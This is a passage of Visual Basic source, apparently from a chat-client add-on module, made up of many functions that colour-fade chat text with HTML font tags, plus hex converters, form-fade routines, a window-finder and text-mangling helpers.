    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (msg)
End Function

Function BoldPurpleGreen(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function BoldPurpleRed(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function BoldPurpleYellow(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function BoldRedBlack(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & d
    Next b
   SendChat (msg)
End Function

Function BoldRedBlue(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (msg)
End Function

Function BoldRedGreen(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function BoldRedPurple(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (msg)
End Function

Function BoldRedYellow(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function BoldYellowBlack(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (msg)
End Function

Function BoldYellowBlue(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   SendChat (msg)
End Function

Function BoldYellowGreen(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   SendChat (msg)
End Function

Function BoldYellowPurple(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   SendChat (msg)
End Function

Function BoldYellowRed(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & d
    Next b
   SendChat (msg)
End Function


'Pre-set 3 Color fade combinations begin here


Function BoldBlackBlueBlack(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<B><U><Font Color=#" & H & ">" & d
    Next b
   SendChat (msg)
End Function
Function BoldBlackBlueBlack2(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   UnderLineSendChat (msg)
End Function
Function BoldBlackGreenBlack(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (msg)
End Function

Function BoldBlackGreyBlack(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (msg)
End Function

Function Bolditalic_BlackPurpleBlack(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        H = RGBtoHEX(G)
        msg = msg & "<B><I><Font Color=#" & H & ">" & d
    Next b
   SendChat (msg)
End Function

Function BoldBlackRedBlack(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (msg)
End Function

Function BoldBlackYellowBlack(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (msg)
End Function

Function BoldBlueBlackBlue(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (msg)
End Function

Function BoldBlueGreenBlue(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (msg)
End Function

Function Bolditalic_BluePurpleBlue(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        H = RGBtoHEX(G)
        msg = msg & "<B><I><Font Color=#" & H & ">" & d
    Next b
 SendChat (msg)
End Function

Function BoldBlueRedBlue(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (msg)
End Function

Function BoldBlueYellowBlue(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (msg)
End Function

Function BoldGreenBlackGreen(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & d
    Next b
  SendChat (msg)
End Function

Function BoldGreenBlueGreen(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & d
    Next b
   SendChat (msg)
End Function

Function BoldGreenPurpleGreen(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & d
    Next b
SendChat (msg)
End Function

Function BoldGreenRedGreen(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & d
    Next b
   SendChat (msg)
End Function


Function BoldGreenYellowGreen(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & d
    Next b
  SendChat (msg)
End Function

Function BoldGreyBlackGrey(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function BoldGreyBlueGrey(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (msg)
End Function

Function BoldGreyGreenGrey(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function BoldGreyPurpleGrey(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function BoldGreyRedGrey(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function BoldGreyYellowGrey(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (msg)
End Function

Function BoldPurpleBlackPurple(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function BoldPurpleBluePurple(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (msg)
End Function

Function BoldPurpleGreenPurple(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (msg)
End Function

Function BoldPurpleRedPurple(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldPurpleRedPurple = (msg)
End Function

Function BoldPurpleYellowPurple(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldPurpleYellowPurple = (msg)
End Function

Function RedBlackRed2(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<B><I><U><Font Color=#" & H & ">" & d
    Next b
  SendChat (msg)
End Function
Function BoldRedBlackRed(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (msg)
End Function
Function BoldRedBlueRed(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (msg)
End Function

Function BoldRedGreenRed(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (msg)
End Function

Function BoldRedPurpleRed(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function BoldRedYellowRed(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (msg)
End Function

Function BoldYellowBlackYellow(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (msg)
End Function

Function BoldYellowBlueYellow(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (msg)
End Function

Function BoldYellowGreenYellow(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (msg)
End Function

Function BoldYellowPurpleYellow(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (msg)
End Function

Function BoldYellowRedYellow(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (msg)
End Function


'Preset 2-3 color fade hexcode generator


Function RGBtoHEX(RGB)
    a = Hex(RGB)
    b = Len(a)
    If b = 5 Then a = "0" & a
    If b = 4 Then a = "00" & a
    If b = 3 Then a = "000" & a
    If b = 2 Then a = "0000" & a
    If b = 1 Then a = "00000" & a
    RGBtoHEX = a
End Function


Sub FadeFormBlue(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 0, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormGreen(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 255 - intLoop, 0), B
    Next intLoop
End Sub

Sub FadeFormGrey(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormPurple(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormRed(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 0), B
    Next intLoop
End Sub

Sub FadeFormYellow(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 0), B
    Next intLoop
End Sub



Function TwoColors(Text, Red1, Green1, Blue1, Red2, Green2, Blue2, WavY As Boolean)
    C1BAK = C1
    C2BAK = C2
    C3BAK = C3
    C4BAK = C4
    c = 0
    o = 0
    o2 = 0
    q = 1
    Q2 = 1
    For X = 1 To Len(Text)
        BVAL1 = Red2 - Red1
        BVAL2 = Green2 - Green1
        BVAL3 = Blue2 - Blue1
        
        val1 = (BVAL1 / Len(Text) * X) + Red1
        val2 = (BVAL2 / Len(Text) * X) + Green1
        VAL3 = (BVAL3 / Len(Text) * X) + Blue1
        
        C1 = RGB2HEX(val1, val2, VAL3)
        C2 = RGB2HEX(val1, val2, VAL3)
        C3 = RGB2HEX(val1, val2, VAL3)
        C4 = RGB2HEX(val1, val2, VAL3)
        
        If C1 = C2 And C2 = C3 And C3 = C4 And C4 = C1 Then c = 1: msg = msg & "<FONT COLOR=#" + C1 + ">"
        If o2 = 1 Then o2 = 2 Else If o2 = 2 Then o2 = 3 Else If o2 = 3 Then o2 = 4 Else o2 = 1
        
        If c <> 1 Then
            If o2 = 1 Then msg = msg + "<FONT COLOR=#" + C1 + ">"
            If o2 = 2 Then msg = msg + "<FONT COLOR=#" + C2 + ">"
            If o2 = 3 Then msg = msg + "<FONT COLOR=#" + C3 + ">"
            If o2 = 4 Then msg = msg + "<FONT COLOR=#" + C4 + ">"
        End If
        
        If WavY = True Then
            If o2 = 1 Then msg = msg + "<SUB>"
            If o2 = 3 Then msg = msg + "<SUP>"
            msg = msg + Mid$(Text, X, 1)
            If o2 = 1 Then msg = msg + "</SUB>"
            If o2 = 3 Then msg = msg + "</SUP>"
            If Q2 = 2 Then
                q = 1
                Q2 = 1
                If o2 = 1 Then msg = msg + "<FONT COLOR=#" + C1 + ">"
                If o2 = 2 Then msg = msg + "<FONT COLOR=#" + C2 + ">"
                If o2 = 3 Then msg = msg + "<FONT COLOR=#" + C3 + ">"
                If o2 = 4 Then msg = msg + "<FONT COLOR=#" + C4 + ">"
            End If
        ElseIf WavY = False Then
            msg = msg + Mid$(Text, X, 1)
            If Q2 = 2 Then
            q = 1
            Q2 = 1
            If o2 = 1 Then msg = msg + "<FONT COLOR=#" + C1 + ">"
            If o2 = 2 Then msg = msg + "<FONT COLOR=#" + C2 + ">"
            If o2 = 3 Then msg = msg + "<FONT COLOR=#" + C3 + ">"
            If o2 = 4 Then msg = msg + "<FONT COLOR=#" + C4 + ">"
        End If
        End If
nc:     Next X
    C1 = C1BAK
    C2 = C2BAK
    C3 = C3BAK
    C4 = C4BAK
    BoldSendChat (msg)
End Function

Function ThreeColors(Text As String, Red1, Green1, Blue1, Red2, Green2, Blue2, Red3, Green3, Blue3, WavY As Boolean)



    d = Len(Text)
        If d = 0 Then GoTo TheEnd
        If d = 1 Then Fade1 = Text
    For X = 2 To 500 Step 2
        If d = X Then GoTo Evens
    Next X
    For X = 3 To 501 Step 2
        If d = X Then GoTo Odds
    Next X
Evens:
    c = d \ 2
    Fade1 = Left(Text, c)
    Fade2 = Right(Text, c)
    GoTo TheEnd
Odds:
    c = d \ 2
    Fade1 = Left(Text, c)
    Fade2 = Right(Text, c + 1)
TheEnd:
    LA1 = Fade1
    LA2 = Fade2
        If WavY = True Then FadeA = TwoColors(Left(LA1, Len(LA1) - 1), Red1, Green1, Blue1, Red2, Green2, Blue2, True) + TwoColors(Right(LA1, 1), Red2, Green2, Blue2, Red2, Green2, Blue2, True)
        If WavY = False Then FadeA = TwoColors(Left(LA1, Len(LA1) - 1), Red1, Green1, Blue1, Red2, Green2, Blue2, False) + TwoColors(Right(LA1, 1), Red2, Green2, Blue2, Red2, Green2, Blue2, False)
        If WavY = True Then FadeB = TwoColors(Left(LA2, Len(LA2) - 1), Red2, Green2, Blue2, Red3, Green3, Blue3, True) + TwoColors(Right(LA2, 1), Red3, Green3, Blue3, Red3, Green3, Blue3, True)
        If WavY = False Then FadeB = TwoColors(Left(LA2, Len(LA2) - 1), Red2, Green2, Blue2, Red3, Green3, Blue3, False) + TwoColors(Right(LA2, 1), Red3, Green3, Blue3, Red3, Green3, Blue3, False)
    msg = FadeA + FadeB
  BoldSendChat (msg)
End Function

Function RGB2HEX(R, G, b)
    Dim X&
    Dim xx&
    Dim Color&
    Dim Divide
    Dim Answer&
    Dim Remainder&
    Dim Configuring$
    For X& = 1 To 3
        If X& = 1 Then Color& = b
        If X& = 2 Then Color& = G
        If X& = 3 Then Color& = R
        For xx& = 1 To 2
            Divide = Color& / 16
            Answer& = Int(Divide)
            Remainder& = (10000 * (Divide - Answer&)) / 625
            If Remainder& < 10 Then Configuring$ = Str(Remainder&) + Configuring$
            If Remainder& = 10 Then Configuring$ = "A" + Configuring$
            If Remainder& = 11 Then Configuring$ = "B" + Configuring$
            If Remainder& = 12 Then Configuring$ = "C" + Configuring$
            If Remainder& = 13 Then Configuring$ = "D" + Configuring$
            If Remainder& = 14 Then Configuring$ = "E" + Configuring$
            If Remainder& = 15 Then Configuring$ = "F" + Configuring$
            Color& = Answer&
        Next xx&
    Next X&
    Configuring$ = TrimSpaces(Configuring$)
    RGB2HEX = Configuring$
End Function

Function TrimSpaces(Text)
    If InStr(Text, " ") = 0 Then
    TrimSpaces = Text
    Exit Function
    End If
    For TrimSpace = 1 To Len(Text)
    thechar$ = Mid(Text, TrimSpace, 1)
    thechars$ = thechars$ & thechar$
    If thechar$ = " " Then
    thechars$ = Mid(thechars$, 1, Len(thechars$) - 1)
    End If
    Next TrimSpace
    TrimSpaces = thechars$
End Function


Function Findchildbyclass(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone

While firs%
firss% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firss%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
Wend
Findchildbyclass = 0

bone:
room% = firs%
Findchildbyclass = room%

End Function
Function Bold_italic_colorR_Backwards(strin As String)
'Returns the strin backwards
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let newsent$ = nextchr$ & newsent$
Loop
BoldRedBlackRed (newsent$)
End Function


Function R_Elite2(strin As String)
'Returns the strin elite
Let inptxt$ = strin
Let lenth% = Len(inptxt$)

Do While numspc% <= lenth%
DoEvents
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let nextchrr$ = Mid$(inptxt$, numspc%, 2)
If nextchrr$ = "ae" Then Let nextchrr$ = "æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "AE" Then Let nextchrr$ = "Æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "oe" Then Let nextchrr$ = "œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "OE" Then Let nextchrr$ = "Œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If crapp% > 0 Then GoTo Greed

If nextchr$ = "A" Then Let nextchr$ = "/\"
If nextchr$ = "a" Then Let nextchr$ = "å"
If nextchr$ = "B" Then Let nextchr$ = "ß"
If nextchr$ = "C" Then Let nextchr$ = "Ç"
If nextchr$ = "c" Then Let nextchr$ = "¢"
If nextchr$ = "D" Then Let nextchr$ = "Ð"
If nextchr$ = "d" Then Let nextchr$ = "ð"
If nextchr$ = "E" Then Let nextchr$ = "Ê"
If nextchr$ = "e" Then Let nextchr$ = "è"
If nextchr$ = "f" Then Let nextchr$ = "ƒ"
If nextchr$ = "H" Then Let nextchr$ = "|-|"
If nextchr$ = "I" Then Let nextchr$ = "‡"
If nextchr$ = "i" Then Let nextchr$ = "î"
If nextchr$ = "k" Then Let nextchr$ = "|‹"
If nextchr$ = "L" Then Let nextchr$ = "£"
If nextchr$ = "M" Then Let nextchr$ = "]V["
If nextchr$ = "m" Then Let nextchr$ = "^^"
